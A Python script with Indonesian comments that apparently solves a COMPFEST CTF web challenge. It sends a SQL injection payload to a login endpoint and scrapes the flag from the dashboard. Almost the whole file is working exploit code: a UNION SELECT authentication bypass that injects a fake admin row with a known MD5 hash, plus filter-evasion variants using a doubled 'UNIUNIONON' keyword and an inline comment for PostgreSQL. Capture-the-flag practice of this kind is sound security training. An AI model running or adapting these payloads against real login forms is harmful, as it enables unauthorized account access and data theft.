import requests
import re
from pwn import * # Digunakan untuk logging yang rapi

# --- KONFIGURASI ---
# Ganti dengan host dan port yang benar
HOST = "ctf.compfest.id" 
PORT = 7302 
LOGIN_URL = f"http://{HOST}:{PORT}/auth/login"
DASHBOARD_URL = f"http://{HOST}:{PORT}/dashboard"

# Password yang kita pilih untuk "admin" palsu kita
KNOWN_PASSWORD = "heker"
# Hash MD5 dari password di atas
KNOWN_PASSWORD_HASH = "bb71befab6a07312b61713e5a18ccb2f"
# --------------------

# --- DAFTAR PAYLOAD UNTUK DICOBA ---
# Ganti 'payload_to_try' dengan salah satu dari payload di bawah ini,
# atau coba variasi Anda sendiri.

# 1. Bypass dengan keyword ganda (jika filter mengganti "UNION" dengan "")
payload_to_try = f"' UNIUNIONON SELECT NULL,'admin@ristek.com','{KNOWN_PASSWORD_HASH}"

# 2. Bypass dengan komentar di dalam keyword (PostgreSQL)
#    Ini adalah teknik yang sangat mungkin berhasil.
# payload_to_try = f"' UNION--\nSELECT NULL,'admin@ristek.com','{KNOWN_PASSWORD_HASH}"

# ------------------------------------

login_data = {
    "email": payload_to_try,
    "password": KNOWN_PASSWORD
}

log.info(f"Mencoba SQL Injection dengan payload: {repr(payload_to_try)}")

with requests.Session() as s:
    # Mengirim POST request langsung untuk bypass validasi browser
    res = s.post(LOGIN_URL, data=login_data)
    
    # Periksa apakah login berhasil dengan mengakses dashboard
    dashboard_res = s.get(DASHBOARD_URL)
    
    if "dashboard" in dashboard_res.url:
        log.success("LOGIN BERHASIL!")
        # Cari flag di dalam konten halaman dashboard
        flag_match = re.search(r'COMPFEST17\{.*?\}', dashboard_res.text) # Sesuaikan format flag
        if flag_match:
            print(f"\nFLAG DITEMUKAN: {flag_match.group(0)}\n")
        else:
            log.warning("Berada di dashboard, tetapi flag tidak ditemukan.")
            print(dashboard_res.text)
    else:
        log.error("Login GAGAL. Payload ini tidak berhasil.")
        # print(res.text) # Uncomment untuk melihat HTML respons